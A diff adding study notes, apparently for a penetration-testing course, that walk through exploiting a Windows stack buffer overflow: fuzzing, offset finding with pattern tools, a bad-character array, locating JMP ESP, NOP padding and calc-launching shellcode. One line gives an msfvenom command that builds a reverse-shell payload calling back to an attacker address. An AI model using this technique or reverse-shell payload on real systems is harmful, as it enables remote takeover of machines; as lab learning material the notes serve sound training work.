@@ -1,0 +1,66 @@
+# Buffer Overflows (BOF)
+
+## Simple Steps
+1. Start application that you want to test
+2. Attach a debugger (OllyDbg, Immunity debugger)
+3. send all A's to verify that a BOF exists (414141..) easy to identify (5000 is generally a good starting point)
+4. remember to pass exception to the program our the EIP wont be over written in the debugger
+5. use msf-pattern_create -l 1000 to generate a pattern. Keep increasing size until it has overwritten the EIP
+6. send the newly created pattern to the application
+7. remember to pass exception to the program (see step 4)
+8. copy the overwritten EIP
+9. use msf-pattern_offset -q <EIP> to find the pattern length to use
+10. Check to make sure you have the right offset. in your script set the buffer to A * <pattern_offset> + B * 4 + C * (<patteren_length> - <pattern_offset> - 4). A = 41, B = 42, C = 43. if correct the EIP will be 42424242
+11. Now check for bad characters, characters that are not displayed correctly. The following is every character setup for use in a python variable:
+```python
+chars=(
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+```
+Note: x00 is always a bad char. its a terminator (shell command: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.199 LPORT=1337 -b "\x00\x0a" -f python -v payload)
+send the above to BOFin your script set the buffer to A * <pattern_offset> + B * 4 + chars + C * (5000 - <pattern_offset> - 4 - len(chars))
+12. remember to pass the exception to the debugger
+13. in the debugger look for all the A's followed by the 4 B's and the C's, the Char is between those two places. Remember machine cade is in reverse oder. any charactors that did not appear are bad and need
+to be noted for later use
+14. Restart the application
+15. Now you need to find a proper value for the EIP. In the debugger find the equivilant to executable modules
+16. Choosing a module is based on a number of factors. Best to stay away from the OS supplied modules and execuatble itself. Best to stay with an app supplied one usually.
+17. In the white space, right click, then click on search for, the all commands
+18. In the seach box type JMP ESP (Can also use a CALL ESP), then click search.
+19. Once you have found one, make sure the adress does not contain any bad chars (such as x00)
+20. Copy the address to clip board and also set a breakpoint so we can make sure our script is working properly
+21. Go back to your script and remove Chars and replace the 4 B's with the memory addess you just copied (make sure to reverse and use byte code format)
+22. Now with the debugger running, run your script. You should see the EIP replace with the memory address for the JMP ESP all CALL ESP and should be stopped at the break point
+23. Now we need to create our payload to execute our exploit. Typically its a good idea to just lauch a calc while you are testing. the calc code follows:
+```byte
+        "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
+        "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
+        "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
+        "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
+        "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
+        "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
+        "\x45\x81\x3e\x43\x72\x65\x61\x75"
+        "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
+        "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
+        "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
+        "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
+        "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
+        "\x6c\x63\x89\xe2\x52\x52\x53\x53"
+        "\x53\x53\x53\x53\x52\x53\xff\xd7"
+```
+24. Add 20 NOPS "\x90" before you code.
+26. You will need to adjust the paramaters such as the amount of A's, or the NOPS until the payload launches. Keep using the debugger.
